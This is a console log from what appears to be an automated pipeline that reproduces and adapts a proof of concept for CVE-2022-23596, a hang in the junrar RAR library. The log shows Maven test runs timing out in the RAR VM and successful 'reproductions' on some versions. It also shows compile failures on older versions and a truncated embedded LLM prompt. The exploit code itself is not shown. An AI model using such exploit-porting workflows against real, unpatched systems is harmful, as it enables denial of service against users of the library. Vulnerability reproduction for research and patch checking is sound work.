[INFO] Finished at: 2025-07-13T18:14:29Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-surefire-plugin:2.12.4:test (default-test) on project CVE-2022-23596: There are test failures.
[ERROR] 
[ERROR] Please refer to /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/target/surefire-reports for the individual test results.
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException

Jul 13, 2025 6:14:27 PM com.github.junrar.rarfile.BaseBlock print
INFO: HeaderType: SubHeader
HeadCRC: 7777
Flags: 7757
HeaderSize: 30583
Position in file: 429
Jul 13, 2025 6:14:27 PM com.github.junrar.rarfile.BlockHeader print
INFO: DataSize: 2004318071 packSize: 2004318071
Jul 13, 2025 6:14:27 PM com.github.junrar.rarfile.SubBlockHeader print
INFO: subtype: null
Jul 13, 2025 6:14:27 PM com.github.junrar.rarfile.SubBlockHeader print
INFO: level: 119
Jul 13, 2025 6:14:27 PM com.github.junrar.Archive setFile
WARNING: exception in archive constructor maybe file is encrypted, corrupt or support not yet implemented
java.lang.NullPointerException
	at com.github.junrar.Archive.readHeaders(Archive.java:438)
	at com.github.junrar.Archive.setFile(Archive.java:170)
	at com.github.junrar.Archive.setVolume(Archive.java:658)
	at com.github.junrar.Archive.<init>(Archive.java:125)
	at com.github.junrar.Archive.<init>(Archive.java:104)
	at com.github.junrar.Junrar.createArchiveOrThrowException(Junrar.java:90)
	at com.github.junrar.Junrar.extract(Junrar.java:32)
	at edu.vision.se.Testcase1.testCorruptHeader(Testcase1.java:19)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base/java.lang.reflect.Method.invoke(Method.java:566)
	at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:59)
	at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
	at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:56)
	at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17)
	at org.junit.internal.runners.statements.FailOnTimeout$CallableStatement.call(FailOnTimeout.java:299)
	at org.junit.internal.runners.statements.FailOnTimeout$CallableStatement.call(FailOnTimeout.java:293)
	at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
	at java.base/java.lang.Thread.run(Thread.java:834)

Jul 13, 2025 6:14:27 PM com.github.junrar.Junrar tryToExtract
INFO: extracting: __MICOSX\._apple)touch-icon-70-precomposed.png

[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.runners.model.TestTimedOutException'[0m
[92m[Verifier] âœ“ Detail matched: 'test timed out after'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[RepairModule] Test repair success with diff[0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2022-23596 on version 5.0.0...[0m
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-23596 >--------------------
[INFO] Building junrar CVE-2022-23596 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-23596 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 0 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-23596 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-23596 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/target/test-classes
[INFO] 
[INFO] --- maven-surefire-plugin:2.12.4:test (default-test) @ CVE-2022-23596 ---
[INFO] Surefire report directory: /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/target/surefire-reports

-------------------------------------------------------
 T E S T S
-------------------------------------------------------
Running edu.vision.se.Testcase1
Tests run: 1, Failures: 0, Errors: 1, Skipped: 0, Time elapsed: 2.043 sec <<< FAILURE!
testCorruptHeader(edu.vision.se.Testcase1)  Time elapsed: 2.019 sec  <<< ERROR!
org.junit.runners.model.TestTimedOutException: test timed out after 2000 milliseconds
	at app//com.github.junrar.unpack.vm.RarVM.ExecuteCode(RarVM.java:348)
	at app//com.github.junrar.unpack.vm.RarVM.execute(RarVM.java:174)
	at app//com.github.junrar.unpack.Unpack.ExecuteCode(Unpack.java:989)
	at app//com.github.junrar.unpack.Unpack.UnpWriteBuf(Unpack.java:412)
	at app//com.github.junrar.unpack.Unpack.unpack29(Unpack.java:353)
	at app//com.github.junrar.unpack.Unpack.doUnpack(Unpack.java:116)
	at app//com.github.junrar.Archive.doExtractFile(Archive.java:576)
	at app//com.github.junrar.Archive.extractFile(Archive.java:518)
	at app//com.github.junrar.LocalFolderExtractor.extract(LocalFolderExtractor.java:60)
	at app//com.github.junrar.Junrar.tryToExtract(Junrar.java:165)
	at app//com.github.junrar.Junrar.extractArchiveTo(Junrar.java:132)
	at app//com.github.junrar.Junrar.extract(Junrar.java:34)
	at app//edu.vision.se.Testcase1.testCorruptHeader(Testcase1.java:19)
	at java.base@11/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base@11/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base@11/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base@11/java.lang.reflect.Method.invoke(Method.java:566)
	at app//org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:59)
	at app//org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
	at app//org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:56)
	at app//org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17)
	at app//org.junit.internal.runners.statements.FailOnTimeout$CallableStatement.call(FailOnTimeout.java:299)
	at app//org.junit.internal.runners.statements.FailOnTimeout$CallableStatement.call(FailOnTimeout.java:293)
	at java.base@11/java.util.concurrent.FutureTask.run(FutureTask.java:264)
	at java.base@11/java.lang.Thread.run(Thread.java:834)


Results :

Tests in error: 
  testCorruptHeader(edu.vision.se.Testcase1): test timed out after 2000 milliseconds

Tests run: 1, Failures: 0, Errors: 1, Skipped: 0

[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  3.309 s
[INFO] Finished at: 2025-07-13T18:14:33Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-surefire-plugin:2.12.4:test (default-test) on project CVE-2022-23596: There are test failures.
[ERROR] 
[ERROR] Please refer to /PoCAdaptation/exploit/result/CVE-2022-23596/5.0.0/exploit/target/surefire-reports for the individual test results.
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException

Jul 13, 2025 6:14:31 PM com.github.junrar.rarfile.BaseBlock print
INFO: HeaderType: SubHeader
HeadCRC: 7777
Flags: 7757
HeaderSize: 30583
Position in file: 429
Jul 13, 2025 6:14:31 PM com.github.junrar.rarfile.BlockHeader print
INFO: DataSize: 2004318071 packSize: 2004318071
Jul 13, 2025 6:14:31 PM com.github.junrar.rarfile.SubBlockHeader print
INFO: subtype: null
Jul 13, 2025 6:14:31 PM com.github.junrar.rarfile.SubBlockHeader print
INFO: level: 119
Jul 13, 2025 6:14:31 PM com.github.junrar.Archive setFile
WARNING: exception in archive constructor maybe file is encrypted, corrupt or support not yet implemented
java.lang.NullPointerException
	at com.github.junrar.Archive.readHeaders(Archive.java:438)
	at com.github.junrar.Archive.setFile(Archive.java:170)
	at com.github.junrar.Archive.setVolume(Archive.java:658)
	at com.github.junrar.Archive.<init>(Archive.java:125)
	at com.github.junrar.Archive.<init>(Archive.java:104)
	at com.github.junrar.Junrar.createArchiveOrThrowException(Junrar.java:90)
	at com.github.junrar.Junrar.extract(Junrar.java:32)
	at edu.vision.se.Testcase1.testCorruptHeader(Testcase1.java:19)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base/java.lang.reflect.Method.invoke(Method.java:566)
	at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:59)
	at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
	at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:56)
	at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17)
	at org.junit.internal.runners.statements.FailOnTimeout$CallableStatement.call(FailOnTimeout.java:299)
	at org.junit.internal.runners.statements.FailOnTimeout$CallableStatement.call(FailOnTimeout.java:293)
	at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
	at java.base/java.lang.Thread.run(Thread.java:834)

Jul 13, 2025 6:14:31 PM com.github.junrar.Junrar tryToExtract
INFO: extracting: __MICOSX\._apple)touch-icon-70-precomposed.png

[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.runners.model.TestTimedOutException'[0m
[92m[Verifier] âœ“ Detail matched: 'test timed out after'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Adapter] Adaptation from 6.0.0 to 5.0.0 successful.[0m
[Adapt] âœ“ Completed: True
[96m[Adapter] Adaptation complete. Retesting exploit on 5.0.0...[0m
[92m[Executor] Adaptation + reproduction successful on 5.0.0[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2022-23596/5.0.0[0m
[1m[Main] === Starting adaptation process for CVE-2022-23596 ===[0m
[96m[Processor] Fetching all available Maven versions...[0m
[96m[Analyzer] Loading cached versions from: /PoCAdaptation/library/com_github_junrar_junrar.txt[0m
[96m[Analyzer] com.github.junrar:junrar has 22 versions (cached).[0m
[96m[Processor] Identifying versions with successful reproduction...[0m
[96m[Processor] Pending versions: ['0.7', '1.0.0', '1.0.1', '2.0.0', '3.0.0', '3.1.0', '4.0.0', '5.0.0'][0m
[96m[Preparer] Pending directory already exists: /PoCAdaptation/exploit/pending/CVE-2022-23596[0m
[92m[Main] Total affected versions: 15[0m
[92m[Main] Already reproduced versions: 12[0m
[93m[Main] Versions pending adaptation: 3[0m
[96m[Main]     -> ['0.7', '1.0.0', '1.0.1'][0m
[96m[Main]     -> ['2.0.0', '3.0.0', '3.1.0', '4.0.0', '5.0.0', '6.0.0', '6.0.1', '7.0.0', '7.1.0', '7.2.0', '7.3.0', '7.4.0'][0m
[96m[Executor] Running initial exploit mvn test in /PoCAdaptation/exploit/origin/CVE-2022-23596/exploit[0m
[91m[Executor] Initial exploit execution finished with return code 1[0m
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-23596 >--------------------
[INFO] Building junrar CVE-2022-23596 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-23596 ---
[INFO] Deleting /PoCAdaptation/exploit/origin/CVE-2022-23596/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 0 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-23596 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-23596 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/origin/CVE-2022-23596/exploit/target/test-classes
[INFO] 
[INFO] --- maven-surefire-plugin:2.12.4:test (default-test) @ CVE-2022-23596 ---
[INFO] Surefire report directory: /PoCAdaptation/exploit/origin/CVE-2022-23596/exploit/target/surefire-reports

-------------------------------------------------------
 T E S T S
-------------------------------------------------------
Running edu.vision.se.Testcase1
Tests run: 1, Failures: 0, Errors: 1, Skipped: 0, Time elapsed: 2.034 sec <<< FAILURE!
testCorruptHeader(edu.vision.se.Testcase1)  Time elapsed: 2.017 sec  <<< ERROR!
org.junit.runners.model.TestTimedOutException: test timed out after 2000 milliseconds
	at app//com.github.junrar.unpack.vm.RarVM.ExecuteCode(RarVM.java:348)
	at app//com.github.junrar.unpack.vm.RarVM.execute(RarVM.java:174)
	at app//com.github.junrar.unpack.Unpack.ExecuteCode(Unpack.java:989)
	at app//com.github.junrar.unpack.Unpack.UnpWriteBuf(Unpack.java:412)
	at app//com.github.junrar.unpack.Unpack.unpack29(Unpack.java:353)
	at app//com.github.junrar.unpack.Unpack.doUnpack(Unpack.java:116)
	at app//com.github.junrar.Archive.doExtractFile(Archive.java:568)
	at app//com.github.junrar.Archive.extractFile(Archive.java:514)
	at app//com.github.junrar.LocalFolderExtractor.extract(LocalFolderExtractor.java:58)
	at app//com.github.junrar.Junrar.tryToExtract(Junrar.java:155)
	at app//com.github.junrar.Junrar.extractArchiveTo(Junrar.java:123)
	at app//com.github.junrar.Junrar.extract(Junrar.java:34)
	at app//edu.vision.se.Testcase1.testCorruptHeader(Testcase1.java:19)
	at java.base@11/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base@11/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base@11/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base@11/java.lang.reflect.Method.invoke(Method.java:566)
	at app//org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:59)
	at app//org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
	at app//org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:56)
	at app//org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17)
	at app//org.junit.internal.runners.statements.FailOnTimeout$CallableStatement.call(FailOnTimeout.java:299)
	at app//org.junit.internal.runners.statements.FailOnTimeout$CallableStatement.call(FailOnTimeout.java:293)
	at java.base@11/java.util.concurrent.FutureTask.run(FutureTask.java:264)
	at java.base@11/java.lang.Thread.run(Thread.java:834)


Results :

Tests in error: 
  testCorruptHeader(edu.vision.se.Testcase1): test timed out after 2000 milliseconds

Tests run: 1, Failures: 0, Errors: 1, Skipped: 0

[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  3.471 s
[INFO] Finished at: 2025-07-13T18:14:38Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-surefire-plugin:2.12.4:test (default-test) on project CVE-2022-23596: There are test failures.
[ERROR] 
[ERROR] Please refer to /PoCAdaptation/exploit/origin/CVE-2022-23596/exploit/target/surefire-reports for the individual test results.
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException

SLF4J: Failed to load class "org.slf4j.impl.StaticLoggerBinder".
SLF4J: Defaulting to no-operation (NOP) logger implementation
SLF4J: See http://www.slf4j.org/codes.html#StaticLoggerBinder for further details.

[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.runners.model.TestTimedOutException'[0m
[92m[Verifier] âœ“ Detail matched: 'test timed out after'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Verifier] Initial exploit behavior verified successfully.[0m
[96m[Selector] Nearest need adapatation version selected: 1.0.1[0m
[96m[Selector] Closest reproduced version: 2.0.0 at index 3[0m
[96m[Adapter] Trying next closest version: 1.0.1[0m
['5.0.0']
[96m[Preparer] Using closest existing exploit version: /PoCAdaptation/exploit/valid/CVE-2022-23596/5.0.0/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2022-23596/1.0.1/exploit[0m
[96m[Preparer] Updating dependency version to 1.0.1 in /PoCAdaptation/exploit/pending/CVE-2022-23596/1.0.1/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 1.0.1 in /PoCAdaptation/exploit/pending/CVE-2022-23596/1.0.1/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 1.0.1...[0m
[96m[Executor] Executing exploit for CVE-2022-23596 on version 1.0.1...[0m
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-23596 >--------------------
[INFO] Building junrar CVE-2022-23596 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-23596 ---
[INFO] Deleting /PoCAdaptation/exploit/pending/CVE-2022-23596/1.0.1/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 0 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-23596 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-23596 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/pending/CVE-2022-23596/1.0.1/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/pending/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[4,25] cannot find symbol
  symbol:   class Junrar
  location: package com.github.junrar
[ERROR] /PoCAdaptation/exploit/pending/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,13] cannot find symbol
  symbol:   variable Junrar
  location: class edu.vision.se.Testcase1
[INFO] 2 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.941 s
[INFO] Finished at: 2025-07-13T18:14:42Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-23596: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/pending/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[4,25] cannot find symbol
[ERROR]   symbol:   class Junrar
[ERROR]   location: package com.github.junrar
[ERROR] /PoCAdaptation/exploit/pending/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,13] cannot find symbol
[ERROR]   symbol:   variable Junrar
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[Adapter] Attempting adaptation from base version 2.0.0 to 1.0.1...[0m
[96m[Adapter] Start adapting exploit from 2.0.0 to 1.0.1"[0m
[96m[Executor] Executing exploit for CVE-2022-23596 on version 1.0.1...[0m
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-23596 >--------------------
[INFO] Building junrar CVE-2022-23596 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-23596 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 0 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-23596 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-23596 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[4,25] cannot find symbol
  symbol:   class Junrar
  location: package com.github.junrar
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,13] cannot find symbol
  symbol:   variable Junrar
  location: class edu.vision.se.Testcase1
[INFO] 2 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.920 s
[INFO] Finished at: 2025-07-13T18:14:44Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-23596: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[4,25] cannot find symbol
[ERROR]   symbol:   class Junrar
[ERROR]   location: package com.github.junrar
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,13] cannot find symbol
[ERROR]   symbol:   variable Junrar
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-23596: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[4,25] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Junrar[0m
[92m[ErrorManager] Processing line: [ERROR]   location: package com.github.junrar[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,13] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable Junrar[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
---------
[LLMClient] Asking: You are given a Java error log when executing 'mvn test' in a project with dependency version 1.0.1:com.github.junrar:junrar.
This test file compiles and runs successfully with version 2.0.0.

Your task is to:
output the location in the project that should be modified to fix the problem **without updating this library**.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-23596 >--------------------
[INFO] Building junrar CVE-2022-23596 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-23596 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 0 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-23596 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-23596 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[4,25] cannot find symbol
  symbol:   class Junrar
  location: package com.github.junrar
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,13] cannot find symbol
  symbol:   variable Junrar
  location: class edu.vision.se.Testcase1
[INFO] 2 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.920 s
[INFO] Finished at: 2025-07-13T18:14:44Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-23596: Compilation failure: Compilation failure: 
